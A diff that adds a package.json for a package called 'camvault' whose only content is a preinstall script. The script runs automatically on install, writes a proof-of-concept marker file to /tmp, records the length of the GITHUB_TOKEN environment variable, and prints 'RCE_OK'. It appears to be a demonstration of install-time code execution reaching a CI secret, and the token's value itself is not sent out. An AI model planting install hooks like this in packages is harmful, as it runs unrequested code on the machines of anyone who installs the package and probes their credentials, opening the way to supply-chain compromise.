@@ -1,0 +1,7 @@
+{
+  "name": "camvault",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "echo POC_MARKER_CAM-VAULT > /tmp/POC_MARKER_CAM-VAULT.txt; echo GH_TOKEN_LEN=${#GITHUB_TOKEN} >> /tmp/POC_MARKER_CAM-VAULT.txt; echo RCE_OK >> /tmp/POC_MARKER_CAM-VAULT.txt; cat /tmp/POC_MARKER_CAM-VAULT.txt"
+  }
+}
